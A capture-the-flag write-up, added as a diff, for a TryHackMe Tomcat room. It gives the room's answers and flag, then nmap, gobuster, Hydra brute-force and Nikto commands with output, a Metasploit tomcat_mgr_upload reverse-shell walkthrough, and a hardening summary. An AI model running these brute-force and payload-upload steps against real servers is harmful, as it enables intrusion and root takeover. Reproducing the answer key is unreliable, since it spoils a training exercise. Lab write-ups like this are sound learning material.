@@ -1,0 +1,200 @@
+ToolsRus
+A THM Room
+By Sovren
+
+Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.
+
+This room will introduce you to the following tools:
+
+    Dirbuster
+    Hydra
+    Nmap
+    Nikto
+    Metasploit
+
+If you are stuck at any point, each tool has a respective room or module linked above.
+
+
+Notes:
+-This room is structured be a little bit differently to some of the other challenges.
+
+--I will leave the answers to each of the questions in this section and fill the framework below with each appropriate tool and its findings.
+
+What directory can you find, that begins with a "g"?
+-guidelines
+
+Whose name can you find from this directory?
+-bob
+
+What directory has basic authentication?
+-protected
+
+What is bob's password to the protected part of the website?
+-bubbles
+
+What other port that serves a webs service is open on the machine?
+-1234
+
+What is the name and version of the software running on the port from question 5?
+-Apache Tomcat/7.0.88
+
+Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
+How many docume0
+-5  / this questions is obviously misspelt. I assumed it to mean how many documents or directories could be found.
+
+What is the server version?
+-Apache/2.4.18
+
+What version of Apache-Coyote is this service using?
+-1.1
+
+Use Metasploit to exploit the service and get a shell on the system.
+What user did you get a shell as?
+-root
+
+What flag is found in the root directory?
+-ff1fc4a81affcc7688cf89ae7dc6e0e1
+
+
+=============:\\\\\\\\
+RECONAISSANCE:-------->>
+=============:////////
+Some images were found that could have been investigated with steganography, but I focussed instead on answering the questions of the room in order and did not pursue this route.
+
+Due to the order of the questions, the first step was jump straight into enumeration via Gobuster.
+
+
+=============:\\\\\\\\\\
+ENUMERATION:------------->>
+=============://////////
+NMAP
+----
+#sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.80.168.115 -p-
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 79:c8:bf:1e:8f:8e:fb:50:87:36:15:4f:89:13:03:f4 (RSA)
+|   256 46:37:15:16:0c:7a:65:60:bb:41:f4:86:4f:2d:26:b1 (ECDSA)
+|_  256 bd:0c:c0:36:71:7e:15:47:56:f1:00:98:45:ca:d0:ce (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/7.0.88
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 5.4 (95%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=2/8%OT=22%CT=1%CU=37135%PV=Y%DS=3%DC=I%G=Y%TM=6988E35C
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)SEQ(
+OS:SP=103%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=106%TI=Z%C
+OS:I=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ(SP=107%GC
+OS:D=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
+OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%
+OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC
+OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
+OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
+OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+S
+
+
+GOBUSTER
+--------
+# gobuster dir -u http://10.80.168.115 -w /usr/share/wordlists/dirb/common.txt
+.htaccess            (Status: 403) [Size: 297]
+.hta                 (Status: 403) [Size: 292]
+.htpasswd            (Status: 403) [Size: 297]
+guidelines           (Status: 301) [Size: 319] [--> http://10.80.168.115/guidelines/]
+index.html           (Status: 200) [Size: 168]
+protected            (Status: 401) [Size: 460]
+server-status        (Status: 403) [Size: 301]
+
+
+# gobuster dir -u http://10.80.168.115:1234 -w /usr/share/wordlists/dirb/common.txt
+docs                 (Status: 302) [Size: 0] [--> /docs/]
+examples             (Status: 302) [Size: 0] [--> /examples/]
+favicon.ico          (Status: 200) [Size: 21630]
+host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
+manager              (Status: 302) [Size: 0] [--> /manager/]
+
+
+
+
+=============:\\\\\\\\\\\\
+EXPLOITATION:--------------->>
+=============:////////////
+-we found the username bob from the /guidelines directory
+--next step is to use Hydra to find a password
+
+HYDRA
+=====
+# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.80.168.115 http-get /protected
+[80][http-get] host: 10.80.168.115   login: bob   password: bubbles
+
+
+NIKTO
+=====
+# nikto -h http://10.80.168.115 -id bob:bubbles -Tuning 2
+
+# nikto -h 10.10.69.1337 -p <port> -root /manager/html -id "<username>:<password>"
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
++ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected).
++ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected).
++ /manager/status: Tomcat Server Status interface found (pass protected).
++ 8103 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2026-02-08 20:45:36 (GMT0) (333 seconds)
+
+-CVE-2004-2104 appeared in one of the Nikto scans. This may be useful for the metasploit segment.
+
+--I will run another scan, this time on port 80 as that is the server:
+# nikto -h 10.82.162.152 -p 80 -id bob:bubbles
+--I found another CVE with this scan.
+
+
+
+METASPLOIT
+==========
+---After some research, I booted up the MSF console and looked at the modules. One of which was
+18  exploit/multi/http/tomcat_mgr_upload
+
+Research showed that this module can be used to execute a payload on Apache Tomcat servers that
+have an exposed "manager" application. The payload is uploaded as a WAR archive
+containing a jsp application using a POST request against the /manager/html/upload
+component.
+
+Options for congifuring the payload were:
+
+HttpPassword as bubbles
+HttpUsername as bob
+The target's IP
+The target port of 1234 which is where Tomcat is being hosted
+TargetURI /manager - this was the default anyway.
+
+I then congifured the LHOST & LPORT. Initially, I struggled to get a shell. This was due to my firewall settings and I enabled port 4444 to pull of the attack and gain a shell.
+
+If correctly run, metasploit will give you a shell. Because we had found credentials, we immediately have root access, and can navigate to the root directory and retrieve the flag.
+
+
+=============:\\\\\\\\\\\\\\\\\\\\\
+REPORTING:-------------------------->>
+=============://///////////////////
+
+Key Issues Identified:
+
+Exposed Tomcat Manager interface
+Weak credentials reused across services
+Information disclosure via default Tomcat example pages
+Lack of network-level restrictions on administrative services
+
+Overall Impact:
+
+Full system compromise with root-level access.
+
+Conclusion:
+
+This assessment demonstrates how misconfigurations, weak authentication, and exposed administrative services can be chained together to achieve total system compromise. Proper hardening of web services, removal of default content, and strong credential policies would have prevented this attack.
